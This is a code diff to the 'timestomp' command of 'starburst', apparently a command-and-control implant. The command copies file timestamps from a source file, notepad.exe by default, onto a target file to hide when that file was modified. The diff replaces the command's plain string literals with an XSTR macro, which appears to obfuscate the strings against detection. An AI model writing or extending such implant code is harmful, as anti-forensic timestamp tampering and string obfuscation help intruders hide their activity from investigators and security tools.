@@ -22,7 +22,7 @@ auto declfn starburst::cmd_timestomp(
     auto target_path = parser_string( params, &target_len );
     if ( !target_path || target_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no target path" ) ) );
+            XSTR( "no target path" ) );
         return;
     }
 
@@ -33,7 +33,7 @@ auto declfn starburst::cmd_timestomp(
     char default_source[48] = { 0 };
     if ( !source_path || source_len == 0 ) {
         str_copy( default_source,
-            symbol<char*>( const_cast<char*>( "C:\\Windows\\System32\\notepad.exe" ) ) );
+            XSTR( "C:\\Windows\\System32\\notepad.exe" ) );
         source_path = default_source;
         source_len = str_len( default_source );
     }
@@ -51,7 +51,7 @@ auto declfn starburst::cmd_timestomp(
 
     if ( !pGetFileTime || !pSetFileTime ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to resolve file time APIs" ) ) );
+            XSTR( "failed to resolve file time APIs" ) );
         return;
     }
 
@@ -70,7 +70,7 @@ auto declfn starburst::cmd_timestomp(
 
     if ( h_source == INVALID_HANDLE_VALUE ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to open source file" ) ) );
+            XSTR( "failed to open source file" ) );
         return;
     }
 
@@ -81,7 +81,7 @@ auto declfn starburst::cmd_timestomp(
     if ( !pGetFileTime( h_source, &ft_create, &ft_access, &ft_write ) ) {
         inst.kernel32.CloseHandle( h_source );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetFileTime failed on source" ) ) );
+            XSTR( "GetFileTime failed on source" ) );
         return;
     }
     inst.kernel32.CloseHandle( h_source );
@@ -101,25 +101,25 @@ auto declfn starburst::cmd_timestomp(
 
     if ( h_target == INVALID_HANDLE_VALUE ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to open target file" ) ) );
+            XSTR( "failed to open target file" ) );
         return;
     }
 
     if ( !pSetFileTime( h_target, &ft_create, &ft_access, &ft_write ) ) {
         inst.kernel32.CloseHandle( h_target );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "SetFileTime failed on target" ) ) );
+            XSTR( "SetFileTime failed on target" ) );
         return;
     }
 
     inst.kernel32.CloseHandle( h_target );
 
     char msg[256] = { 0 };
-    str_copy( msg, symbol<char*>( const_cast<char*>( "timestamps copied from " ) ) );
+    str_copy( msg, XSTR( "timestamps copied from " ) );
     uint32_t slen = str_len( src_buf );
     if ( slen > 100 ) slen = 100;
     memory::copy( msg + str_len( msg ), src_buf, slen );
-    str_concat( msg, symbol<char*>( const_cast<char*>( " to " ) ) );
+    str_concat( msg, XSTR( " to " ) );
     uint32_t tlen = str_len( tgt_buf );
     if ( tlen > 100 ) tlen = 100;
     memory::copy( msg + str_len( msg ), tgt_buf, tlen );
